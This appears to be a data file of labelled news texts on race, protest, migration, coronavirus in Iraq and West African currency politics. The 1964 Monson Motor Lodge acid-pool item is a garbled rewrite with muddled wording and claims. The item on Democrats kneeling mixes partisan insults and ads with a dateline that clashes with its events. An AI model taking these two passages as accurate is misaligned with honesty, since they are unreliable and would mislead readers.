coronavirus do?” Iraq reported five new suspected coronavirus cases on Tuesday, which would bring the total to 32 if they are confirmed. The country’s first case was diagnosed only last week. Most of Iraq’s cases to date can be traced to Iran, where Iraqi Shiites frequently travel to visit holy shrines that have become major sources of concern to epidemiologists (and the scenes of some very ill-considered acts of defiance against the virus). The Iraqi protest movement was already critical of Iran’s influence over politics in Iraq. According to AFP, “anti-Iranian sentiment” is on the rise due to the coronavirus. Iranian officials have been notoriously secretive about the spread of the virus in their country, and the protesters think Iraqi officials have been no more honest. Iraq’s containment procedures proved a mixed blessing for the protesters, since school closings freed up more students to take to the streets, while some influential Iraqis have instructed their followers to stay home to keep the coronavirus from spreading. The resignation of Iraqi Prime Minister-designate Mohammed Allawi on Monday infused the demonstrations with renewed energy. Kurdish news service Rudaw was not favorably impressed by how the government of the semi-autonomous Kurdistan Region of Iraq is handling the epidemic: Rumors and mixed messages about the coronavirus spread on social media and by word of mouth have left Erbil residents frightened and confused, undermining measures to prevent an outbreak in the Kurdistan Region. Even though coronavirus is spread through person to person contact and can be transmitted rapidly in crowded urban spaces, Erbil’s downtown bazaar was packed with shoppers and traders on Saturday evening. […] It seems a lot of the misinformation spreading in Erbil is coming from social media – often an unreliable source. Dilshad Kochar, 29, who sells mobile phone cases in the Erbil bazaar, said the public has been left “ignorant”. “Now it turns out that social media is full of lies,” he said. “Look, in the last few days, every pharmacy was packed with people buying masks. Now you show me how many people use masks. You will barely find anyone.” “I read on social media a list of nutritional items needed to strengthen the immune system such as apples, lemons, and oranges,” Kochar said. “But then yesterday, I came across a friend who had seen a doctor. The doctor had advised him not to eat anything that contains sugar, even fruits and vegetables including apples and lemons and other stuff. You tell me, what should I do?” he added with exasperation. Kochar told Rudaw he was particularly happy to learn from the social media rumor mill that “smoking is good,” which would come as surprising news to the coronavirus victims of China, a land of heavy smokers. Other odd beliefs floating around Kurdistan include women having exceptional resistance to infection, children under 12 being completely immune, and the virus being a microscopic soldier of Allah sent to punish the Chinese for bullying Muslims. The Kurdistan Regional Government reported its fifth case of the coronavirus on Monday in the province of Sulaimani. The head of the Sulaimani Health Directorate denied rumors that one of the patients was killed by the coronavirus.

1,"During an emotional Monday ceremony in Pearl Harbor, Acting Navy Secretary Thomas Modly honored the legacy of World War II hero Doris Miller by bestowing his name on a future aircraft carrier. It marks the first time a flattop has paid homage to an African American, a Navy Cross recipient and an enlisted service member. And it was decreed on a day set aside to remember the Rev. Martin Luther King Jr. and his lifelong crusade to end racial discrimination across the United States. With the USS Arizona Memorial his backdrop, Modly sketched how Miller rose to battle on the morning of Dec. 7, 1941, a mess attendant in a racially segregated rating that made African American men servants to white officers. Instead of collecting the morning’s laundry, Miller carried wounded shipmates from the blazing battleship West Virginia after it was hit by enemy fire. He fought the flames as they erupted on the vessel and then manned a .50 caliber machine gun — a weapon he never operated previously — to swat away Japanese planes during the ongoing surprise attack that launched the United States into World War II. His ammo spent and ordered to abandon ship, he was one of the last three sailors to escape the West Virginia. Advanced to mess attendant first class on June 1, 1942, and awarded the Navy Cross for combat valor, Miller was killed 17 months later when a Japanese submarine sank the escort carrier Liscome Bay off Makin Atoll during the invasion of the Gilbert Islands. “He died as he lived, an American sailor defending his nation, shoulder to shoulder with his shipmates, until the end,"" said Modly. ""Dorie Miller stood for everything that is good about our nation. His story deserves to be remembered and repeated wherever our people continue to stand the watch today. “He’s not just the story of one sailor. It is the story of our Navy, of our nation and our ongoing struggle to form — in the words of our Constitution — a more perfect union.” The future aircraft carrier Miller won’t be the first Navy vessel to honor the hero. On June 20, 1973, the Navy commissioned the destroyer escort Miller — which was reclassified as a frigate two years later. Modly said that when completed, the new Doris Miller, a Gerald R. Ford-class carrier, will be the most powerful and lethal warship ever built by man. Designed to operate deep into the 21st century, more than 100,000 officers and crew will serve on the carrier, many of them yet to be born. The bulk of those sailors and Marines will be enlisted, the men and women Modly called “the steel spine of our ships.” He said the faces of a great and diverse crew will go with their carrier to every corner of the globe as a visible symbol of American values. The name of the carrier also will remind the nation of its everlasting debt to the veterans of World War II who, like Miller, sacrificed so that future American generations would be free. The acting secretary traced a similar journey Miller’s legacy took in the mid-20th century, from his day of courage in Pearl Harbor to a budding civil rights movement that leaned on him as an example to force a wartime nation to open up its defense plants to African Americans. Modly pointed to the bitter irony of African American service members who fought tyranny abroad in World War II only to return home to a nation that denied them liberty simply because of the color of their skin. He drew a moral arc from Miller’s heroism and quietly persuasive call for positive change during the war to the core message of Martin Luther King Jr.'s 1963 Letter from a Birmingham Jail: “Injustice anywhere is a threat to justice everywhere. We are caught in an inescapable network of mutuality, tied in a single garment of destiny.” That same line continued to Aug. 28, 1963, on the National Mall, when King stood before the Lincoln Memorial and uttered his “I Have a Dream” speech to thousands of peaceful protesters during the March on Washington for Jobs and Freedom. And then it all returned to Pearl Harbor, where Modly officially named a new carrier in Miller’s honor, only a short distance from where he became one of the first Americans to fight in World War II. “In selecting this name, we honor the contributions of all our enlisted ranks, past and present, men and women, of every race, religion and background,” said Modly. “Dr. Martin Luther King, Jr. observed, ‘Everybody can be great - because anybody can serve.' No one understands the importance and true meaning of service than those who have volunteered to put the needs of others above themselves.” That spirit was bipartisan. U.S. Rep. Bill Flores, a Republican who represents Miller’s hometown of Waco, pointed to the importance of a carrier named after an enlisted hero, saying that it will serve as inspiration to future generations of young service members. Also born in segregated Waco but today representing Dallas, Rep. Eddie Bernice Johnson recalled hearing the tale of Miller’s heroism from her father. She continues to spearhead the push on Capitol Hill and inside the Pentagon to upgrade Miller’s Navy Cross to the Medal of Honor. “My journey’s not quite over,"" she said. Prine came to Navy Times after stints at the San Diego Union-Tribune and Pittsburgh Tribune-Review. He served in the Marine Corps and the Pennsylvania Army National Guard. His awards include the Joseph Galloway Award for Distinguished Reporting on the military, a first prize from Investigative Reporters & Editors and the Combat Infantryman Badge.

1,"Cyril Ramaphosa (Photo Credit: National.ae) Nigerians and other foreign nationals resident South Africa’s Keimoes and Upington areas of Northern Cape Province were on Thursday morning given 12 hours to vacate by the indigenes. The President of Nigeria Union in South Africa, Adetola Olubajo, made the disclosure in a statement made available to the News Agency of Nigeria (NAN) on Thursday in Lagos. Mr Olubajo said the development was as a result of an ugly incident that took place on Wednesday between a police officer and a Nigerian. He said that the Nigerian man, an indigene of Abakaliki in Ebonyi State, allegedly stabbed to death the police officer, Nico Visagie, during a disagreement at 5 a.m. Mr Olubajo said the details of the disagreement were still not very clear as the major witness was also stabbed multiple times and was still in critical condition at the hospital. “After the horrific incident, the community members of Keimoes and environs went on rampage burning and destroying properties belonging to foreign nationals, Nigerians in particular. “These attacks spread to Upington and Nigerians and other foreign nationals were also expelled from Upington. “Prompt Police intervention this morning brought about calm but the situation is still tensed. Some locals were arrested by the police for public disturbance and malicious damage to properties. “They appeared in a magistrates’ court this morning for bail hearing,’’ he said. He added that the suspect who stabbed the police officer had been arrested and would appear in court on or before next Monday.  “We commend the swift intervention of the members of the South African Police Service (SAPS) and the arrest of the suspect is a welcome development. “We hope the police will continue to maintain law and order in the area,’’ Mr Olubajo said. Keimoes is a town in the Northern Cape Province of South Africa. It lies on the Orange River and is about halfway between Upington and Kakamas.

You can find more information in our data protection declaration. Anglophone ECOWAS members have criticized plans by the bloc's French-speaking states to change the CFA franc's name to 'Eco'. ECOWAS had planned to launch a common currency under the same name in 2020.   English-speaking members of Economic Community of West African States (ECOWAS), plus Guinea, on Thursday condemned a recent announcement that the French-backed CFA franc used in eight West African countries would be renamed as the Eco. The move ""is not in line"" with plans by the regional bloc to adopt a single currency also called the Eco, they said in a statement issued after talks in the Nigerian capital, Abuja. In late December 2019, Ivory Coast President Alassane Ouattara announced that the West African CFA franc, used by the former French colonies of Benin, Burkina Faso, Ivory Coast, Mali, Niger, Senegal and Togo, as well as by Guinea-Bissau, would be retired sometime in 2020 and replaced with a new currency – called the Eco. ECOWAS member's Gambia, Ghana, Guinea, Liberia, Nigeria and Sierra Leone have their own currencies The Francophone Eco, like the outgoing CFA, will be pegged to the euro. It will eliminate the requirement for members to lodge half of their reserves in the French treasury. France will also quit the currency's managerial institutions. Ouattara's announcement came as a surprise to the six mainly Anglophone ECOWAS members who don't use the CFA franc. This is because back in June 2019, ECOWAS leaders had formally decided at a summit that the region's planned common currency should be called Eco — the same name as the CFA zone group now plans to adopt. In a statement following Thursday's meeting, Nigerian Finance Minster Zainab Ahmed said the December announcement was ""inconsistent with the decision of the Authority of the Heads of State and Government of ECOWAS for the adoption of the Eco as the name of an independent ECOWAS single currency."" CFA franc hugely unpopular The CFA Franc, first introduced by France in 1945, has long been attacked as a colonial relic, triggering protests in countries such as Senegal and Ivory Coast. At this rally in Senegal in 2017, protesters called for an end to the CFA franc ""There has been a lot of pressure in these Francophone countries to reduce France's influence,"" said Tokunbo Afikuyomi, chief editor of the Nigerian business publication, Stears. ""So they have now decided that they need to act quickly and form a new arrangement for a new currency."" With Ivory Coast and Togo facing presidential elections in 2020, and Burkina Faso and Niger parliamentary elections, the announcement of the CFA franc's demise could be seen as an electorate pleaser, the economics expert said. The problem, Afikuyomi said, is that ECOWAS as a block wasn't moving fast enough to bring in its own regional currency that could potentially have replaced the CFA franc. ""What [the Francophone countries] have done has kind of blind-sided the rest of the ECOWAS group. They have almost taken it upon themselves to push ahead with the Eco plan."" 'Interesting timing' Afikuyomi also called the timing of the announcement ""politically and economically interesting"" considering the tensions between Nigeria and its neighbors, which include Francophone Benin and Niger, following Nigeria's decision to close its borders as of August 2019. ""Nigeria is trying to exclude everyone else with its protectionist policies, so it could be that [the Francophone countries] are thinking: 'Now, let's do something else that excludes Nigeria.' That is also coming into play,"" he said. ECOWAS countries not ready The idea of a common currency for the West African region was first mooted almost 30 years ago in the hope of boosting cross border trade and economic development. Its introduction has been postponed several times. In 2019, ECOWAS set a new target of 2020 for the single currency; most analysts, however, see this as highly unlikely. Currently, only Togo and Conakry Guinea met the criteria for joining the ECOWAS-planned currency, according to Nigerian economist, Akpan Ekpo ""But you cannot have a monetary union with these two small economies,"" he said in a written statement to DW, adding that Nigeria, West Africa's biggest economy, and other countries like Ghana, Ivory Coast and Senegal must be part of the union for it to succeed. Nigeria makes up about two-thirds of West Africa's GDP, complicating the push for a common currency Nigeria, however, has been struggling economically. While Ghana is enjoying some economic stability, its debt has surged massively in the past few years meaning won't meet the criteria any time soon. Meanwhile, the economy of the Ivory Coast is booming, but it's facing political instability ahead of the October elections. ""This all needs to be dealt with before [ECOWAS] can move forward,"" said Ghanaian economist Kwame Pianim on the phone from Accra. Sola Jaiyesimi in Abuja contributed to this report. Brian Otieno's photo ""Dancing in the Streets"" is part of his ""Kibera Stories"" series, which reveal a different, poetic and beautiful side of daily life in Kibera, the largest slum in Nairobi, located in the southwestern part of the capital.

1,"CAIRO (AP) — Two Sudanese sisters, Seham and Ekhlas Bashir, were walking their children home from elementary school in a Cairo neighborhood when a group of Egyptian teenagers crowded around them. The boys taunted them, calling them “slave” and other slurs. Then they tried to rip off Ekhlas’ clothes. An onlooker intervened, scolding the young harassers, and the sisters and their three children managed to escape. But they were shaken. They had just arrived in Cairo months earlier, fleeing violence in their homeland. The harassment brought up traumatic memories of detention, torture and rape they said they experienced at the hands of militias in Sudan’s Nuba mountains. “We have come here seeking safety,” said Ekhlas, recounting the incident that took place in November. “But the reality was very different.” Egypt has for decades been a refuge for sub-Saharan African migrants trying to escape war or poverty. But the streets of Cairo, a metropolis of some 20 million, can bring new dangers in the form of racist harassment or even violence in ways that other significant migrant communities here, such as Libyans and Syrians, don’t face. While other major centers of African migration like Europe have been wrestling with racist violence, Egypt has only made small starts toward addressing the issue. The U.N.’s International Organization for Migration says Egypt hosts more than 6 million migrants, more than half of them from Sudan and South Sudan, where simmering conflicts continue to displace tens of thousands of people annually. For some, Egypt is a destination and a haven, the closest and easiest country for them to enter. For others, it is a point of transit before attempting the dangerous Mediterranean crossing to Europe. In visits to several migrant communities throughout Cairo, at least two dozen sub-Saharan Africans, including four children, told The Associated Press that they have endured racist insults, sexual harassment or other abuses in the past three months. The children said they have had rocks and trash thrown at them as they go to or from school. One woman from Ethiopia said neighbors pound on the windows of her family’s home, yelling “slaves” before disappearing into the night. There are signs that Egypt is starting to recognize and censure racist crimes. In November, there was a public outcry over a video that went viral showing three Egyptian teenagers bullying a schoolboy from South Sudan. In the video, taken by mobile phone, the teenagers block the boy’s way, laughing and making fun of his appearance before trying to take his backpack. In the aftermath, police detained the teenagers for a day before their families reached a settlement with the family of the South Sudanese boy, John Manuth. Weeks later, Egypt’s President Abdel-Fattah el-Sissi hosted Manuth at a youth forum in the Egyptian resort of Sharm el-Sheikh and made a rare high-level acknowledgement of the problem. “They are our guests and negative treatment is not acceptable and not allowed,” el-Sissi told the audience. In 2018, a court sentenced to seven years in prison a man who was known to harass refugees and who beat to death a South Sudanese teacher who had worked in a community-run school for refugees in Cairo. Refugees and rights workers say the country still has a long way to go. Reported cases of sexual and gender-based violence against migrants has increased in recent months, according to the IOM. Women and girls are the most effected, but so are vulnerable men and young boys, said Shirley De Leon, a project development officer at the organization. She said that could in part be because of Egypt’s economic strains — “challenges remain and are exacerbated by inflation, eroded income and high youth unemployment.” Most migrants live in crowded poorer neighborhoods, where they form insular communities in small, packed apartment buildings. The idea is to protect families and vulnerable new arrivals from abuses. Racism has roots in Egyptian society. For centuries, Egypt was colonized by Arab, Turkish and European imperial powers. Lighter skin was identified with the elite. Darker-complexioned Egyptians and sub-Saharan Africans have been portrayed as doormen, waiters, and cleaners in films for decades. Some Egyptians still unabashedly address people by their skin color, calling them “black,” “dark,” or “chocolate.” Historically, many have preferred to think of themselves as Arab, rather than African. Attia Essawi, an expert on African affairs at Cairo’s al-Ahram Center for Political and Strategic Studies, says it will take a lot to break some societal beliefs. “Authorities should be decisive, with more severe measures against racism and bullying,” he said. But for many, reporting a crime is not an option. Two South Sudanese women, who work as part-time house cleaners, told the AP they had been sexually assaulted by their employers. Neither of them reported the allegations to police, as one of them has not finalized her documents as a migrant in Egypt and the other feared reprisals from her attacker. For the same reasons, they spoke on condition of anonymity. Now, they and others say they make sure to be home by nightfall, and only go out in groups. El-Sissi has said in the past that his country doesn’t need camps for refugees, because it is welcoming and absorbs them so readily. Many sub-Saharan African migrants enter the country legally but overstay visas. Enforcement on those who stay illegally is lax, and a large number of them work in the huge informal economy as street vendors and house cleaners. In a café frequented by migrants in a central Cairo neighborhood, Ethiopian refugee Ahmed el-Athiopi says that he came to the city five years ago to escape repression at home. He believes the only reason he has been able to keep a job is because he makes half that of an Egyptian. For now, though, he says Cairo remains his best available option. “I hope things get better in the future. Here is much better than in my home country as there is likely a zero chance to leave for Europe,” he said."

In a call with the U.S. Black Chamber of Commerce that was added to his public schedule, Biden said he would never “take the African American community for granted.” “I shouldn’t have been such a wise guy,” Biden said. “No one should have to vote for any party based on their race or religion or background.” That was an acknowledgement of the stinging criticism he received in response to his comments, which he made earlier in the day on “The Breakfast Club,” a radio program that is popular in the black community. The rebukes included allies of Trump’s reelection campaign — anxious to go on the offense after weeks of defending the Republican president’s response to the coronavirus pandemic — and some activists who warned that Biden must still court black voters, even if African Americans overwhelmingly oppose the president. “None of us can afford for the party or for this campaign to mess this election up, and comments like these are the kinds that frankly either make black voters feel like we’re not really valued and people don’t care if we show up or not,” said Alicia Garza, a Black Lives Matter co-founder and principal of Black Futures Lab. Near the end of Biden’s appearance on the radio program, host Charlamagne Tha God pressed him on reports that he is considering Minnesota Sen. Amy Klobuchar, who is white, to be his vice presidential running mate. The host told Biden that black voters “saved your political life in the primaries” and “have things they want from you.” Biden said that “I guarantee you there are multiple black women being considered. Multiple.” A Biden aide then sought to end the interview, prompting the host to say, “You can’t do that to black media.” Biden responded, “I do that to black media and white media,” and said his wife needed to use the television studio. He then added: “If you’ve got a problem figuring out whether you’re for me or for Trump, then you ain’t black.” Trump’s campaign and his allies immediately seized on Biden’s comments. South Carolina Sen. Tim Scott, a Trump supporter and the Senate’s sole black Republican, said he was “shocked and surprised” by Biden’s remarks. “I was struck by the condescension and the arrogance in his comments,” Scott said in a conference call arranged by the Trump campaign. “I could not believe my ears that he would stoop so low to tell folks what they should do, how they should think and what it means to be black.” Charlamagne Tha God later said on CNN, “A black woman running mate is necessary, especially after today.” He added that the question of “what makes somebody black” is a discussion for black people, not for “a white man.” Trump himself has a history of incendiary rhetoric related to race. When he launched his presidential campaign in 2015, Trump called many Mexican immigrants “rapists.” Campaigning in 2016, he asked black voters, “What the hell do you have to lose?” In 2017, he said there are good people on “both sides” of the clash in Charlottesville, Virginia, between white supremacists and anti-racist demonstrators that left one counterprotester dead. In 2018, during a private White House meeting on immigration, Trump wondered why the United States was admitting so many immigrants from “shithole countries” like African nations. He also blasted four Democratic congresswomen of color, saying they hate America and should “go back” to where they come from, even though all are U.S. citizens and three were born in the U.S. Black voters helped resurrect Biden’s campaign in this year’s primaries with a second-place finish in the Nevada caucuses and a resounding win in the South Carolina primary after he’d started with embarrassing finishes in overwhelmingly white Iowa and New Hampshire. Sixty-one percent of black voters supported Biden during the primary season, according to AP VoteCast surveys across 17 states that voted in February and March. Biden is now seeking to maintain his standing with black voters while building the type of multiracial and multigenerational coalition that twice elected Barack Obama, whom he served as vice president. He has already committed to picking a woman as his running mate and is considering several African American contenders who could energize black voters. But Biden is also considering candidates such as Klobuchar, who could appeal to white moderates. There is little chance of a sudden shift in support for Trump among black voters. A recent Fox News poll shows just 14% of African Americans who are registered to vote have a favorable opinion of Trump, compared with 84% who view him unfavorably. Seventy-five percent of African American registered voters say they have a favorable view of Biden; 21% hold an unfavorable opinion. There is a risk, however, of black voters, especially those who are younger, staying home in November, which could complicate Biden’s path to victory in a tight election. The Breakfast Club is a particularly notable venue for Biden’s comments because the program is popular among younger African Americans. Adrianne Shropshire, executive director of BlackPAC, a national organization that works to mobilize black voters, said many black Americans are loyal Biden supporters. But she said his comments make it harder to attract people who are on the fence about voting. “The first thing I thought about was to what degree did this just turn off those voters and how much more work the rest of us are going to have to do to convince people that it is worth their time and their efforts,” she said. Biden’s selection of a running mate, along with his pledge to appoint the first black female Supreme Court justice, could help motivate voters. He’s begun vetting vice presidential contenders, a process he’s said will likely last through July. Several black women are among those under consideration, including California Sen. Kamala Harris, Georgia voting rights advocate Stacey Abrams, Atlanta Mayor Keisha Lance Bottoms, Florida Rep. Val Demings, Ohio Rep. Marcia Fudge and Susan Rice, Obama’s former U.S. ambassador to the U.N.

1,"Chuck Lovell named Portland police chief Not yet six months into her job, Portland Police Chief Jami Resch stepped down Monday and announced that she had asked Chuck Lovell, an African American lieutenant, to replace her. The stunning change in leadership comes as city police are under fire for their handling of massive demonstrations across the city spurred by the May 25 killing of George Floyd, a black man who died after a white Minneapolis police officer knelt on his neck for nearly nine minutes. ""When your boss comes to you and says the community needs you,'' Lovell said he had to take on the important responsibility. ""I felt like if I in some small way could be the start for some community healing, it was my duty to do that,'' he said. Lovell, hired as a police officer in Portland in 2002, becomes the fourth African American to lead the city’s police force of about 950 sworn officers. Resch said she considered the community’s needs and believed the change was necessary. ""I have asked Chuck Lovell to step into the role as chief of the Police Bureau,'' she said at a noon news conference. ""He’s the exact right person at the exact right moment.'' She described Lovell, 46, as a ""most compassionate, humble, genuine to the core'' person and one who never set out to be police chief. “You never wanted it,” Resch said. “You were meant for it.” A Q & A with Portland's new police chief, Jami L. Resch. January 23, 2020 Beth Nakamura/Staff She said the decision was hers and that she will continue at the bureau in a role to be defined. She alerted Mayor Ted Wheeler of her desire to step aside about midday Sunday and met with Lovell also on Sunday. The mayor, who serves as police commissioner, approved of the move. Her resignation marks the second major shakeup for the bureau in the past year, following the sudden departure in December of Chief Danielle Outlaw, the first African American woman to lead the bureau, who took the police commissioner job in Philadelphia. Lovell said he was stunned to hear Resch’s request. ""She felt like now was the right time for her to step back and for me to step forward,'' he said. Tony Hopson Sr., director of the Self Enhancement Inc. youth and family support program and a leader in Portland’s African American community, lauded Resch and said her move to step down was “virtually unheard of.” He credited Resch’s courage and selflessness in trying to improve police-community relations at a crucial time. Resch said she made the decision after listening to people like Hopson. “I’ve asked our community time and time again, what do we need to do. The Portland Police Bureau has made change ... but in the words of Mr. Hopson, those are changes but they are not the change. What the Portland Police Bureau has not done is stand up and say, ‘We will be the change.'” Under Resch, Lovell led a new Community Services Division as an acting captain. The division includes the Behavioral Health Unit, a community engagement officer, a new homeless community liaison and a new civilian community engagement specialist. Lovell also served as Outlaw’s executive assistant. He was promoted to sergeant in July 2011 and lieutenant in July 2017. He has been active with the community, serving as a school resource officer at Jefferson High School, as a mentor in a ""Boys to Men'' program and on the board of Lines for Life, a nonprofit that operates a crisis call center. Lovell hasn’t been sworn in as chief yet and doesn’t yet have a contract or new salary worked out. Wheeler said he’s ""100 percent confident'' that Lovell is the right person for the job. ""Together we will work on meaningful and bold reforms,'' Wheeler said. The mayor acknowledged that the bureau has ""missed talent'' in promotions and succession planning. Lovell said he was completely caught by surprise by Resch’s request. He said he will work to convey the ""heart'' of the Police Bureau and its officers to the city. ""Let them know we are here to serve you, we are here to protect you,'' Lovell said. ""We fall down sometimes. We need to stand by each other.'' Lovell said he was most disturbed by the videotaped images from Minneapolis of George Floyd’s final moments in police custody and was struck by the ""lack of care or compassion'' by the officers involved. “That’s what stuck with me - the thought that that’s an idea that could exist. The fight is not with each other. The fight is against that idea – that people, institutions, the agencies that can harbor that feeling in their heart,” Lovell said. ""That’s the true enemy. That’s what we should all be fighting against.'' ""We have a lot of work to do,'' he added. ""We’ll get busy doing that.'' Lovell described himself as a public servant. ""I’m humbled,'' he said. ""I’m going to show up every day with a servant’s heart. I’m going to listen. I’m going to care about the community and care about people in the organization. All I can do is be me.'' In response to questions about recent videos of police using batons and tear gas to clear protesters from Chapman Square, Lovell said he hadn’t seen the images. He glanced at his watch, noting that the ""last 20-ish hours have just been a whirlwind'' for him. ""We have systems of accountability. Our officers are well-trained. They’re out to keep the peace. I’m sure we’ll look at whatever video there is to look at and we’ll make some determinations,'' he said. ""I want to be clear. We want to give great service. We want to do the best job that we can, but I also want to protect officers and give them the tools they need to do the job that we ask them to do. That’s the only fair way to lead them.'' But in an indication of the firestorm Lovell has taken on, his appointment drew criticism as too little, too late from some activists and came amid lawsuits against the city over police crowd control tactics. A Portland couple filed a lawsuit Monday against the city in Multnomah County Circuit Court seeking up to $200,000 in damages for their exposure to tear gas during the June 2 protest. It follows a federal lawsuit filed last week by the group Don’t Shoot Portland against the city seeking a temporary restraining order to bar police from using tear gas and smoke. Portland’s Independent Police Review office, the intake center for complaints against police, also announced that it has received “a high volume” of more than 2,300 contacts in the last week about the police response to the demonstrations, police funding or police contract negotiations as well as several dozen complaints about specific protest interactions with officers. The office also noted it has received eight commendations about police actions. The Portland African American Leadership Forum and Unite Oregon, meanwhile, released a statement rejecting the change in leadership as a positive step and calling for dismantling the Police Bureau. “The relentless violence that Portland Police have inflicted on Black Portlanders since this city was founded cannot be wished away with a staffing change, because that violence is built into the concept of policing itself,” the statement said. The city’s most recent African American chief was Outlaw, who took the reins in October 2017 after rising in the Oakland Police Department to deputy chief. Charles Moose, Portland’s first African American chief, held the job from 1993 to summer 1999 and Derrick Foxworth was chief from 2003 to June 2006. Antoinette Edwards, retired director of the city’s Office of Youth Violence Prevention, described Lovell’s appointment as historic and said she told Lovell that he’s worthy of the post. She urged community support for him. Donald Dixon, a longtime counselor at Jefferson High School, said he got to know Lovell when he worked as a school resource officer at Jefferson. Lovell made kids feel comfortable and quickly became keyed in on what was going on in the school and in the community, Dixon said. Ronnie Herndon, a longtime African American community activist who is the director of Portland’s Albina Head Start program, said Lovell helped him maintain a healthy environment for at-risk students. He called Lovell ""a person who not only cares but he acts.'' Herndon said he knows the new chief will face some stormy days, ""but we’ll be right there with you.'' Portland police Officer Daryl Turner, president of the Portland Police Association, called Resch’s move a ""sacrifice'' that ""will not go unnoticed.'' ""At a time when our nation, our city, our communities, and our officers are facing some of the most difficult days, it takes a person of incredible courage and character to balance the needs of everyone involved. I want to thank Chief Resch for her leadership and dedication to the organization,'' Turner said in a statement on behalf of the rank-and-file union. At the same time, Turner said, ""I look forward to working with Chief Lovell as we head into a new era in policing and continue to evolve and grow along with the needs of the diverse communities we protect and serve.'' Herman Greene, senior pastor at the Abundant Life PDX church in North Portland, joined a stream of supporters who praised Lovell at the news conference, saying Lovell cares about people and not politics. ""Today, the community got what it needed,'' Greene said. -- Maxine Bernstein Email at mbernstein@oregonian.com; 503-221-8212 Follow on Twitter @maxoregonian Subscribe to Facebook page Subscribe to Oregonian/OregonLive newsletters and podcasts for the latest news and top stories.

1,"  You are here: by Collin Rugg January 17, 2021, 6:52 am  Speaker of the House Nancy Pelosi, Senate Minority Leader Chuck Schumer and other Democratic leaders took a knee for a photo-op in the United States Capitol on Monday. Pelosi, Schumer and failed presidential candidate Cory Booker took a knee together for eight minutes and 46 seconds, the time that a Minneapolis officer was kneeling on George Floyd’s neck, while wearing African garbs in an effort to virtue signal and gain attention. ***FIGHT BACK Against Liberal Censorship. Download Our Free Trump News App*** The Democratic leaders seemed to get a pass from the far-left mob who often call people out for cultural appropriation. Check out what the Daily Wire reported: Floyd, who is black, died last month after a police officer had his knee on the 46-year-old’s neck for eight minutes and 46 seconds during an arrest, as shown in viral video footage. Since the incident, all four officers involved in the arrest have been fired, investigations from the FBI and state law enforcement have been opened, and the officer at the center of the incident was taken into custody and charged with second-degree murder The three other officers involved have since been charged, too. Conservative activist Candace Owens made sure to comment on the “photo op” as she unloaded on Democratic leaders for pandering for the “black vote.” ***Get your Patriotic face masks with FREE SHIPPING today*** “I have to say— I thought there was at least one or two things that the Democrats wouldn’t stoop to for the black vote, but there is a apparently nothing,” Owens said. “Dressing in African garb and getting on their knees for a photo op because it’s Monday, & only 4 months to November.” Pelosi also commented during her virtue signaling photo op. “The martyrdom of George Floyd gave the American experience a moment of national anguish as we grieve for the black Americans killed by police brutality today,” she said. “This moment of national anguish is being transformed into a movement of national action as Americans from across the country peacefully protest to demand an end to injustice,” Pelosi continued. “Today, with the justice and policing at the Congress is standing with those fighting for justice and taking action.” WATCH the clip below: ***FIGHT BACK Against Liberal Censorship. Download Our Free Trump News App*** Many leaders are coming forward in support of the kneeling movement including British journalist Piers Morgan. On Monday, Morgan suggested that President Donald Trump should kneel in the Oval Office to unite the country from the death of George Floyd. Morgan strongly supported the protests and demonstrations that took place, including the incidents where police officers as well as the National Guard knelt with the protesters. “Doubtless President Trump views Biden and all the new kneelers in the same ‘son of a bitch’ way he viewed NFL stars led by Colin Kaepernick when they took the knee during the national anthem,” Morgan wrote in The Daily Mail. “Yet the cold hard truth for the President is that Kaepernick’s been shown by George Floyd’s murder to be on the right side of history, and Trump’s increasingly showing himself to be on the wrong side.” The comments from Morgan come in response to the President’s treatment of sport stars who kneel during the National Anthem. “If President Trump really wants to make a statement about race and unity, one that rocks the entire world, then with the American people watching live on TV, he should simply take the knee in the Oval Office,” Morgan continued. “In one stunning moment, Trump could heal so many wounds, unify so much of the country, and quite probably get himself re-elected.” What are your thoughts?

1,"Among the most alleged images in history is that of James Brock, the motel manager, who poured acid into the pool where black people were swimming. The photo was taken by Horace Cort at the Monson Motor Lodge swimming pool on 18th of June 1964. In reality, the famous photo shows a group of black and white inclusionists during a 1964 protest. The demonstration was related to the St. Augustine Campaign, named after the town where it took place in Florida. Violent reactions have resulted in many peaceful protests and marches and tricky protests. On June 11, 1964, after being requested to leave its secluded restaurant, Martin Luther King, Jr was arrested for infringement at Monson Motor Lodge. This led a number of black and white demonstrators to jump into the pool as a planned strategy to end racial in the “White Only” motel pools. White people who were paying for motel rooms welcomed blacks to join them as their guests in the motel pool. Dr. Martin Luther King, Jr and his colleagues organized this swimming. In an attempt to disconnect the party, Jimmy Brock, Motel Manager, poured a bottle of Muriatic Acid into the swimming pool and eventually left the building. One of the swimmers, who knew the acid-to-pool ratio was so high that it was not a threat to them, was drinking a handful of pool water to sooth the fears of other swimmers. Numerous people from that time remember Brock in the acid incident as being more the victim. What the protesters heard, however, was the word “acid” It was nervous to everyone but finally convinced others to not be afraid because the amount of acid was small to the amount of water in the pool. And then a policeman jumped in to have the demonstrators arrested. After the incident, in this acid incident, many people from that time believed that James Brock was more the victim. That unfortunate event has left an unwanted and indelible legacy. “The brunt of this kind was caught by Jimmy. He has been a good man, “said his long-standing friend and fellow hotelier, Eddy Mussallem. “They had to choose a hotel, so Jimmy’s hotel was chosen. I told him he did a dumb thing every time. The pressures on James Brock were placed on civil rights and militant whites to fight integration. In his house in St. Augustine Jimmy Brock died in 2007. He was just 85 years old. In March 2003, despite five years of protests, the Monson Motor Lodge and swimming pool were demolished, removing one of Civil Rights Movement’s country landmarks.

(WAVY) — A North Carolina man accused of making a threatening call to an African American church in Virginia Beach last week was arrested on Friday by federal authorities. John Malcolm Bareswill was charged with making a telephonic threat to use fire to kill, injure, or intimidate any individual, or unlawfully to damage or destroy a building. The 63-year-old is a Navy veteran from Catawba, North Carolina, who works and lives in Virginia Beach. The call to New Hope Baptist Church was placed on the morning of June 7, authorities say, days after a member of the church participated in a local prayer vigil at Mount Trashmore in the wake of George Floyd’s death. A federal affidavit filed on June 11 shows Bareswill called the church and said “you [racial slur] need to shut up” and threatened to burn down the church. The call was on speakerphone and three young children were present in the room. Previous coverage: Police investigate threat to burn a black church in Virginia Beach The affidavit is in support of the FBI criminal complaint and shows that Bareswill was questioned June 9 outside his place of business. It continues that a search of his mobile phone revealed an outgoing call to the church at 395 Old Great Neck Road that corresponded with phone records at the church. His browser history also shows that he searched the internet for several phrases, including “Who said all whites are racist,” “Black Lives Matter protest held in Virginia,” and “Who organized the protests from mount trashmore to town center.” Additionally, the document says the suspect searched for at least three African-American religious institutions in the area including New Hope Baptist Church. On Saturday, WAVY confirmed that Bareswill is the owner of a UPS Store in the Kempsville area. State Corporation 